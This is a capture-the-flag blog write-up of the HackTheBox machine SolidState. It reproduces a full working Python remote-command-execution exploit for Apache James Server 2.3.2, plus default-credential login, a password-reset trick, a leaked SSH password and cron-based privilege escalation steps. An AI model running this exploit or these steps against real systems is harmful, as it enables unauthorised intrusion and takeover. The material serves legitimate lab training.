---
title: "SolidState"
date: 2023-06-26T12:51:31+02:00
tags: ["linux","James Server"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/SolidState.png
description: "This write-up will be about the HackTheBox machine called SolidState. "
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "A windows room that is vulnerable to James Server."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

## Room Information

- Room name: SolidState
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/SolidState

![Untitled](/HTB/SolidState.png)

## Tools Used

- Nmap
- nc
- searchsploit

## Port Scanning

Other room, other port scan.

- As always:
	
	```bash
	 sudo nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oN escaneo
	```
![Untitled](/HTB/nmap-solidstate.png)

I found 5 open ports 22(tcp), 25(smtp James Server), 80(http), 110(pop3 James Server), 119(nntp James Server).

## Enumeration

As always I first do a scan with `whatweb 10.10.10.51`, but on this case it throws me nothing relevant. So next,
I tried to do a scan of posible directories, and nothing relevant to. I tried to do a very intensive research becaus 
the last machine I did, I spent a lot of time for this reason. In this case I can say that there's aparently
nothing vulnerable.


## Exploiting

So after all of the above, I started looking for information about the remaining ports and discovered that there 
were different ways to obtain information by using `nc` or `telnet`.

![Untitled](/HTB/119-solidstate.png)

It took me a bit longer to set up this machine since port 4555 wasn't displayed in my nmap analysis, but eventually, I realized that it was indeed open. 
It was thanks to this that I managed to hack into the machine, as I read online that there was a possibility of 
being able to log in with root/root. 

![Untitled](/HTB/110-solidstate.png)

After this, I was able to modify the passwords for all the email users and 
thus connect to port 110 with telnet using mindy/platano. Following that, I started investigating Mindy's emails 
and found one containing some credentials, which allowed me to connect via SSH to the user mindy.

![Untitled](/HTB/pass-solidstate.png)

Initially, I had a bit of trouble with the bash shell when working with the mindy user, but later I found two ways to overcome 
it: with an exploit that I will provide below, and with `sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 bash`.

```bash
 #!/usr/bin/python
 #
 # Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
 # Date: 16\10\2014
 # Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
 # Vendor Homepage: http://james.apache.org/server/
 # Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
 # Version: Apache James Server 2.3.2
 # Tested on: Ubuntu, Debian
 # Info: This exploit works on default installation of Apache James Server 2.3.2
 # Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

 import socket
 import sys
 import time

 # specify payload
 #payload = 'touch /tmp/proof.txt' # to exploit on any user 
 payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt' # to exploit only on root
 # credentials to James Remote Administration Tool (Default - root/root)
 user = 'root'
 pwd = 'root'

 if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

 ip = sys.argv[1]

 def recv(s):
        s.recv(1024)
        time.sleep(0.2)

 try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
 except:
    print "Connection failed."

```

![Untitled](/HTB/mindy-solidstate.png)

![Untitled](/HTB/casiroot-solidstate.png)

The machine is pawned :) !!!

## TTY Treatment

```bash
 script /dev/null -c bash
 ctrl + z
 stty raw -echo; fg
 restet xterm
 export TERM=xterm
```

## Gaining an Initial Foothold

We are in now so, as always I do:

```bash
 sudo -l
 cat /etc/crontab
 find / -perm -4000 2>/dev/null
 find / -type f -writable 2>/dev/null
 bash procmon.sh
 lsb_release -a
 uname -a
 id
 getcap -r / 2>/dev/null
 ...
```
At first I started to get frustrated because trying with procmon.sh and doing a `cat /etc/hosts` I didn't get 
any curious process. But when I did a `find / -type f -writable 2>/dev/null` I found that there was a 
file in the temporary directory and it was running every 1 minitu so I got on with it.

![Untitled](/HTB/root-solidstate.png)

All that's left to do is `bash -p`.

And was root !!!

## Lessons Learned

- What insights did you gain from the room?
    
    I learned about the James Server and ports 25, 119 and 4555.
    
- Were there any novel tools or techniques employed?
    
    The the methodology of these ports.
